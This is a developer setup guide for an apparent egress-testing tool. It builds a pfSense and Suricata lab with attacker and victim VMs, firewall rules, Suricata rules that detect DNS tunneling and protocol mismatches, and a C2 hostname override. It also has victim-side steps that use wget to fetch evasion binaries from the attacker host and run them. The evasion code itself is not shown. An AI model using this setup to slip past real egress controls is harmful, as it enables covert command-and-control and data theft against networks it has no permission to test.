This note is for anyone who wants to work on this project further, and want to establish a baseline, and understand which part does what.
For the people who just want to use the tool for engagements, refer Usage section in [readme](readme.md) 

Requirements--
1. pfSense vm, with 2 "Internal Network" network interfaces - internal(lan) and external (wan) (Note - for installation, keep the wan network adapter as "NAT", cuz this needs internet connection. You can change it back to "Internal network" adapter after the installation)
2. Attacker vm with the pfSense's wan network adapter as "Internal Networl" network adapter.
3. Victim vm with the pfSense's lan as "Internal Network" network adapter.
4. Suricata on pfSense (can be installed from WebUI)

Note --
The Vms are set in such a way that traffic from vitim machine can reach attacker machine only through the pfSense vm.
The inbound traffic rules are pretty chill to virtuall non-existent in this setup, cuz the aim is to find egress.

Steps to reproduce-- 
1. boot up pfsense
2. boot up victim machine
3. Access victim machine's web UI at http://192.168.1.1/
```txt
admin : pfsense for login

Interfaces → WAN → IPv4 Configuration 
Type: Static IPv4 
Address: 10.0.0.2 / 24 
Save → Apply Changes

Lan configuration should be DHCP by default.
```
4. Add ACL rules for port blocking --generated by AI
```txt
Rule 1: 1. Anti-Lockout Rule (it'll be there by default)
#delete any other rule that exists (should be the other default ones)

Rule 2:
  Action: Pass
  Protocol: TCP
  Source: LAN subnet
  Destination: any
  Destination Port: 80
  Description: allow HTTP

Rule 3:
  Action: Pass
  Protocol: TCP
  Source: LAN subnet
  Destination: any
  Destination Port: 443
  Description: allow HTTPS

Rule 4: (optional)
  Action: Pass
  Protocol: TCP
  Source: LAN subnet
  Destination: any
  Destination Port: 8080
  Description: allow HTTP alt

Rule 5:
  Action: Pass
  Protocol: UDP
  Source: LAN subnet
  Destination: any
  Destination Port: 53
  Description: allow DNS

Rule 6:
  Action: Pass
  Protocol: UDP
  Source: LAN subnet
  Destination: any
  Destination Port: 123
  Description: allow NTP

Rule 7:
  Action: Block
  Protocol: any
  Source: LAN subnet
  Destination: any
  Description: block everything else
```
5. ssh into pfSense from victim machine (or you can just do it on pfSense vm, but paste dint work for me)
```zsh
#ssh victim to pfSense, setup rules same password from webUI admin:pfsense
ssh admin@192.168.1.1
#pfsense

vi /usr/local/etc/suricata/suricata_8459_em1/rules/custom.rules

#paste these rules in it. 8080 is optional, depending on your ACL --generated by AI
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"Raw TCP on port 80 - not HTTP"; flow:established,to_server; content:!"GET "; sid:9000001; rev:1;)
alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:"Raw TCP on port 8080 - not HTTP"; flow:established,to_server; content:!"GET "; sid:9000002; rev:1;)
alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:"Raw TCP on port 443 - not TLS"; flow:established,to_server; content:!"|16 03|"; sid:9000003; rev:1;)
alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:"Possible DNS tunneling - long subdomain label"; byte_test:1,>,40,12; sid:9000004; rev:1;)
alert udp $HOME_NET any -> $EXTERNAL_NET 123 (msg:"Malformed NTP - zero transmit timestamp"; content:"|00 00 00 00 00 00 00 00|"; offset:40; depth:8; sid:9000005; rev:1;)
alert udp $HOME_NET any -> $EXTERNAL_NET 123 (msg:"Malformed NTP - packet too short"; dsize:<48; sid:9000006; rev:1;)
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"HTTP missing or suspicious User-Agent"; flow:established,to_server; http.user_agent; content:!"Mozilla"; sid:9000007; rev:1;)

#to verify
suricata -T -c /usr/local/etc/suricata/suricata_8459_em1/suricata.yaml

#now restart suricata
pfSsh.php playback svc restart suricata
```
6. Clone the repo, setup the evading and raw client/servers in separate dirs. Setup network interface with IP, and bring the interface up. (Here, interface is eth1, because my eth0 is NAT, for internet access)
```zsh
#attacker
git clone #---
cd egress_whisperer
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -sha256 -days 365 -nodes -subj "/CN=egress-whisperer.local"
#go get utls
go get github.com/refraction-networking/utls
GOOS=linux GOARCH=amd64 go build -o client client.go
GOOS=linux GOARCH=amd64 go build -o server server.go

cd raw_infra;
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -sha256 -days 365 -nodes -subj "/CN=egress-whisperer.local"
#might need to `go get` utls.
go get github.com/refraction-networking/utls
GOOS=linux GOARCH=amd64 go build -o server_raw server_raw.go
GOOS=linux GOARCH=amd64 go build -o client_raw client_raw.go

#client is the one that evades. clinet_raw only sends messages over raw packets (no HTTP/TLS/DNS/NTP)

#setup the IP for the interface and bring it up
#It is eth1 for me, because my eth0 is a NAT adapter. check yours
sudo ip addr add 10.0.0.1/24 dev eth1
sudo ip link set eth1 up
sudo ip route add 192.168.1.0/24 via 10.0.0.2

#now, we can transfer the executable binary to 
cd ../ #(be in the dir where both evade and raw dirs are present)
python -m http.server 80
#once transfer is complete, kill the python server

```
7. setup dns resolver on pfSense's webUI from victim machine. In real engagement, resolution is done by some external resolver, because A c2 would be registering themselves as a legit server, and those DNS servers would have the necessary records.
```txt
Services → DNS Resolver → Host Overrides → Add

Host:    c2
Domain:  egress-whisperer.local
IP:      10.0.0.1
Save → Apply
```
8. Run shizz
```zsh
wget 10.0.0.1/client
wget 10.0.0.1/raw_infra/client_raw

chmod +x client client_raw

#start evading server on the attacker `./server [-debug on/off]`
#then run the client from victim
./client -target 10.0.0.1 [-stealth 2] [-timeout 3s] [-ports 80, 443, 53]
#this should give you a report
#now on attacker, kill the server

#start the server_raw on attacker
#run the client_raw (no stealth feature in this)
./client_raw -target 10.0.0.1
#another report

#wait a few minutes
#to check the surricata logs,
cat /var/log/suricata/suricata_8459_em1/alerts.log
#Alternatively, alerts will also pop up on the WebUI at Services->Suricata -> alerts
```
